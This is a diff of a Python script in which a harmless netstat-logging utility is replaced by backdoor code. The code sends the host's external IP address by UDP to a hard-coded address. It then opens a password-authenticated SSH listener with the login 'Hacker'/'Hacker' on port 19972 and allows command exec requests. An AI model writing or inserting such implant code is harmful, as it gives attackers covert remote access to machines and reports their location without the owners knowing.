@@ -1,21 +1,98 @@
 #EXEC
+import socket
 import subprocess
+import threading
 
-def save_netstat_output_to_file(file_path):
+# Function to get the external IP address
+def get_external_ip():
+    # Use a service to determine the external IP address
     try:
-        # Run netstat command
-        netstat_output = subprocess.check_output(['netstat', '-n', '-a'])
+        external_ip = subprocess.check_output(['curl', 'ifconfig.me'], stderr=subprocess.STDOUT).decode().strip()
+        return external_ip
+    except subprocess.CalledProcessError:
+        return None
 
-        # Decode bytes to string
-        netstat_output = netstat_output.decode('utf-8')
+# Function to send UDP packet containing the external IP
+def send_udp_packet(ip, port, data):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(data.encode(), (ip, port))
+        sock.close()
+        print(f"[*] UDP packet sent to {ip}:{port}")
+    except Exception as e:
+        print("[!] Error sending UDP packet:", e)
 
-        # Write output to file
-        with open(file_path, 'w') as file:
-            file.write(netstat_output)
-        
-        print("Netstat output has been saved to", file_path)
-    except subprocess.CalledProcessError as e:
-        print("Error occurred while running netstat command:", e)
+# Function to start SSH server
+def start_ssh_server():
+    try:
+        import paramiko
+
+        # Define SSH server parameters
+        SSH_PORT = 19972
+        SSH_USERNAME = "Hacker"
+        SSH_PASSWORD = "Hacker"
+
+        # SSHServerHandler class to handle incoming SSH connections
+        class SSHServerHandler(paramiko.ServerInterface):
+            def __init__(self):
+                self.event = threading.Event()
+
+            def check_auth_password(self, username, password):
+                return username == SSH_USERNAME and password == SSH_PASSWORD
+
+            def get_allowed_auths(self, username):
+                return 'password'
+
+            def check_channel_request(self, kind, chanid):
+                if kind == 'session':
+                    return paramiko.OPEN_SUCCEEDED
+                return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+
+            def check_channel_exec_request(self, channel, command):
+                # Allow execution of commands
+                return True
+
+        # SSH server initialization
+        def start_ssh_server():
+            # Create a socket
+            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            server_socket.bind(('0.0.0.0', SSH_PORT))
+            server_socket.listen(100)
+
+            print(f"[*] Listening for SSH connections on port {SSH_PORT}")
+
+            while True:
+                client_socket, client_address = server_socket.accept()
+                print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")
+
+                # Start a new thread for each connection
+                ssh_session = paramiko.Transport(client_socket)
+                ssh_session.add_server_key(paramiko.RSAKey.generate(2048))
+                server = SSHServerHandler()
+
+                ssh_session.start_server(server=server)
+                print("[*] SSH server session started")
+
+        # Start the SSH server
+        start_ssh_server()
+    except Exception as e:
+        print("[!] Error starting SSH server:", e)
 
 if __name__ == "__main__":
-    save_netstat_output_to_file("data.log")
+    # Define the target to send the UDP packet
+    COMMUNICATE_WITH = ("192.168.137.27", 19927)  # Change "target_ip" to the appropriate IP address
+
+    # Get external IP address
+    external_ip = get_external_ip()
+
+    if external_ip:
+        # Send the external IP address via UDP packet
+        send_udp_packet(COMMUNICATE_WITH[0], COMMUNICATE_WITH[1], external_ip)
+        print(f"[*] External IP address sent: {external_ip}")
+
+        # Start SSH server
+        start_ssh_server()
+    else:
+        print("[!] Failed to retrieve external IP address.")
+
